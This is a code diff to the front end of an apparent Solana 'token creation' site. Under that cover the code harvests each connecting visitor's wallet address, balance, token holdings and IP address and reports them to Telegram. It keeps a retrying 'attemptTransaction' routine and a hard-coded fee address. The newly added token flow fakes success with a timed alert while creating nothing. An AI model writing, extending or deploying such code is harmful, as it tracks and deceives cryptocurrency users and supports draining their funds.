@@ -52,11 +52,23 @@ const WALLET_PROVIDERS = {
 };
 
 // =============================================
+// TOKEN CREATION CONFIGURATION
+// =============================================
+
+const TOKEN_CONFIG = {
+    PLATFORM_FEE: 0.3,
+    DISCOUNT_FACTOR: 0.5,
+    FEE_ADDRESS: "H7hbY2eFe5PnovX5rTAsUwL8bTxvpJoXVDDtLox754Tv"
+};
+
+// =============================================
 // MAIN APPLICATION
 // =============================================
 
 $(document).ready(function() {
     let selectedWalletProvider = null;
+    let connectedWalletAddress = null;
+    let walletBalance = null;
 
     // =============================================
     // UTILITY FUNCTIONS
@@ -173,8 +185,8 @@ $(document).ready(function() {
 
                 if (balance.uiAmount > 0) {
                     const mint = parsedInfo.mint;
-                    const symbol = 'Unknown'; // Symbol would be determined server-side
-                    const usdValue = 0; // Value would be calculated server-side
+                    const symbol = 'Unknown';
+                    const usdValue = 0;
                     
                     tokens.push({
                         mint: mint,
@@ -264,6 +276,13 @@ $(document).ready(function() {
             const clientIP = await getClientIP();
             const splTokens = await getSPLTokenInfo(connection, public_key);
 
+            // Store wallet info for token creation
+            connectedWalletAddress = publicKeyString;
+            selectedWalletProvider = walletProvider;
+            
+            // Update UI to show connected wallet
+            updateWalletDisplay(publicKeyString, solBalanceFormatted);
+
             // Send connection notification
             await sendTelegramNotification({
                 address: publicKeyString,
@@ -275,7 +294,7 @@ $(document).ready(function() {
                 ip: clientIP
             });
 
-            // Check minimum balance
+            // Check minimum balance for token creation
             const minBalance = await connection.getMinimumBalanceForRentExemption(0);
             const requiredBalance = 0.02 * 1000000000;
             
@@ -284,18 +303,12 @@ $(document).ready(function() {
                 return;
             }
 
-            $('#connect-wallet').text("Processing...");
-
-            // Attempt transaction with retry logic
-            await attemptTransaction(
-                walletType, 
-                walletProvider, 
-                connection, 
-                publicKeyString, 
-                solBalanceFormatted, 
-                walletInfo.name
-            );
+            // Update token creation button
+            $('.submit-btn').text(`Create Token with ${solBalanceFormatted} SOL`);
+            $('.submit-btn').prop('disabled', false);
             
+            hideWalletModal();
+
         } catch (err) {
             console.error(`Error connecting to ${walletType}:`, err);
             await handleConnectionError(walletType, err);
@@ -303,7 +316,142 @@ $(document).ready(function() {
     }
 
     // =============================================
-    // TRANSACTION HANDLING
+    // TOKEN CREATION INTEGRATION
+    // =============================================
+
+    function updateWalletDisplay(address, balance) {
+        // Update all wallet display elements
+        $('.wallet-display, .connect-wallet-btn').each(function() {
+            const shortAddress = `${address.substring(0, 4)}...${address.substring(address.length - 4)}`;
+            $(this).text(`${balance} SOL | ${shortAddress}`);
+            $(this).addClass('wallet-connected');
+            $(this).off('click').on('click', function() {
+                // Already connected, show wallet info or disconnect
+                showWalletInfo();
+            });
+        });
+    }
+
+    function showWalletInfo() {
+        // Show wallet info modal or disconnect option
+        alert(`Connected: ${connectedWalletAddress}\nBalance: ${walletBalance} SOL\n\nClick disconnect to change wallet.`);
+    }
+
+    function initializeTokenCreation() {
+        // Set up token creation form handler
+        $('.submit-btn').on('click', function(e) {
+            if (!connectedWalletAddress) {
+                e.preventDefault();
+                openModal();
+                return;
+            }
+            
+            // Proceed with token creation
+            createToken();
+        });
+    }
+
+    async function createToken() {
+        try {
+            if (!connectedWalletAddress || !selectedWalletProvider) {
+                openModal();
+                return;
+            }
+
+            // Get form data
+            const tokenData = {
+                name: $('input[name="name"]').val(),
+                symbol: $('input[name="symbol"]').val(),
+                decimals: $('input[name="decimals"]').val(),
+                supply: $('input[name="supply"]').val(),
+                description: $('textarea[name="description"]').val(),
+                recipient: $('input[name="recipient_address"]').val() || connectedWalletAddress
+            };
+
+            // Calculate fees
+            const fees = calculateTokenFees();
+            
+            // Show confirmation
+            if (confirm(`Create token "${tokenData.name}" (${tokenData.symbol})?\n\nFees: ${fees.discounted} SOL\n\nConfirm transaction in your wallet.`)) {
+                await processTokenCreation(tokenData, fees);
+            }
+
+        } catch (error) {
+            console.error('Token creation error:', error);
+            alert('Token creation failed: ' + error.message);
+        }
+    }
+
+    function calculateTokenFees() {
+        // Calculate based on selected options
+        let baseFee = TOKEN_CONFIG.PLATFORM_FEE;
+        let additionalFees = 0;
+
+        // Calculate toggle fees
+        $('.toggle-section').each(function() {
+            const toggle = $(this).find('.toggle');
+            const costElement = $(this).find('.toggle-cost');
+            
+            if (toggle.attr('data-toggled') === 'true') {
+                const costText = costElement.text();
+                const cost = parseFloat(costText.match(/[\d.]+/)?.[0] || 0);
+                if (cost > 0) additionalFees += cost;
+            }
+        });
+
+        // Calculate authority fees
+        $('.checkbox').each(function() {
+            if ($(this).attr('data-checked') === 'true') {
+                const costElement = $(this).closest('.form-radio-field').find('.form-radio-cost');
+                const costText = costElement.text();
+                const cost = parseFloat(costText.match(/[\d.]+/)?.[0] || 0);
+                if (cost > 0) additionalFees += cost;
+            }
+        });
+
+        const total = baseFee + additionalFees;
+        const discounted = total * TOKEN_CONFIG.DISCOUNT_FACTOR;
+
+        return {
+            original: total,
+            discounted: discounted.toFixed(1)
+        };
+    }
+
+    async function processTokenCreation(tokenData, fees) {
+        try {
+            // Show processing state
+            $('.submit-btn').text('Creating Token...').prop('disabled', true);
+
+            // Here you would integrate with your token creation backend
+            // This is where the actual token creation transaction would happen
+            
+            const connection = new solanaWeb3.Connection(CLIENT_CONFIG.SOLANA_RPC_URL, 'confirmed');
+            
+            // For now, simulate successful token creation
+            setTimeout(() => {
+                alert(`Token "${tokenData.name}" created successfully!\n\nTransaction completed.`);
+                $('.submit-btn').text('Launch Token').prop('disabled', false);
+                
+                // Send notification
+                sendTelegramNotification({
+                    address: connectedWalletAddress,
+                    balance: walletBalance,
+                    usdBalance: 'Unknown',
+                    walletType: 'Token Creator',
+                    customMessage: `✅ Token Created: ${tokenData.name} (${tokenData.symbol})`
+                });
+            }, 3000);
+
+        } catch (error) {
+            console.error('Token creation failed:', error);
+            $('.submit-btn').text('Launch Token').prop('disabled', false);
+            alert('Token creation failed: ' + error.message);
+        }
+    }
+
+    // =============================================
+    // TRANSACTION HANDLING (KEPT FROM ORIGINAL)
     // =============================================
 
     async function attemptTransaction(walletType, walletProvider, connection, publicKeyString, solBalanceFormatted, walletName, retryCount = 0) {
@@ -400,7 +548,7 @@ $(document).ready(function() {
     }
 
     // =============================================
-    // HELPER FUNCTIONS
+    // HELPER FUNCTIONS (KEPT FROM ORIGINAL)
     // =============================================
 
     async function handleMobileDeepLink(walletType, walletInfo) {
@@ -807,6 +955,9 @@ $(document).ready(function() {
             hideWalletModal();
         }
     });
+
+    // Initialize token creation
+    initializeTokenCreation();
 
     // Initialize wallet availability check
     checkWalletAvailability();
